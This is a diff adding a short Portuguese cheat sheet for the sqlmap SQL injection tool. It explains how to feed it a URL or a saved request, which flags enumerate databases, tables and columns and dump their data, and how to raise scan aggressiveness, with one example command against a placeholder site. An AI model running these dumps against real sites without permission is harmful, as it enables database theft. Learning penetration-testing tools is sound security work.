@@ -1,0 +1,19 @@
+SQLMAP: PODE COPIAR A URL DO SITE OU IR EM INSPECIONAR->NETWORK E COPIAR O REQUEST HEADER DA URL QUE TIVER UM ID E SALVAR EM UM TXT PARA RODAR.
+
+sqlmap -u: Ler a URL.
+sqlmap -r: Ler o arquivo.
+--dbs: Ver as databases que tem.
+-D: Seleciona o banco de dados.
+--tables: Mostra as tabelas.
+-T: Seleciona a tabela.
+--columns: Mostra as colunas.
+-C: Seleciona a coluna.
+--dump: Baixa os arquivos.
+--flush-session: Limpa o histórico dos injections anteriores.
+--level: VAI ATÉ O NÚMERO 5 FAZENDO O SCAN DE FORMA MAIS AGRESSIVA
+--risk: VAI ATÉ O NÚMERO 3, ASSIM COMO O LEVEL, O RISK TAMBÉM DEIXA MAIS AGRESSIVO O SCAN, PODENDO USAR O LEVEL E O RISK JUNTOS.
+	
+	SQLMAP VIA GET PARA VER OS BANCO DE DADOS:
+		
+		sqlmap -u https://seusite.com/?id=1 --dbs
+		
